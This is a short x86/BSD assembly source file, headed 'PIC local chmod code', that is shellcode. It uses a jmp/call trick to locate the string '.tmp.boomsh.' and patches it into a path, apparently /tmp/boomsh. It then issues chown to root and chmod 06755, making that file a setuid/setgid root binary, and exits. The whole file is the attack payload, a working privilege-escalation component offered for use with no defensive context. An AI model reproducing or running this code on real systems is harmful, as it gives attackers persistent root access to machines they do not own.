/* x86/BSD PIC local chmod code
 *
 * by stealth
 */

	.globl cbegin
	.globl cend

cbegin:
	jmp	boomsh

foo:	popl	%ebx
	incl	(%ebx)
	incl	4(%ebx)
	
	xorl	%eax, %eax
	movb	%al, 11(%ebx)
	
	movb	$16, %al	/* chown */
	xorl	%ecx, %ecx
	pushl	%ecx
	pushl	%ecx
	pushl	%ebx
	pushl	$1
sys_1:  int	$0x80
	
	xorl	%eax, %eax	/* chmod */
	movb	$15, %al
	pushw	$06755
	pushl	%ebx
	pushl	$1
sys_2:	int	$0x80
	
	xorl	%eax, %eax
	incl	%eax		/* exit */
	pushl	$1
sys_3:	int	$0x80

boomsh: call foo
	.string ".tmp.boomsh.";
cend:


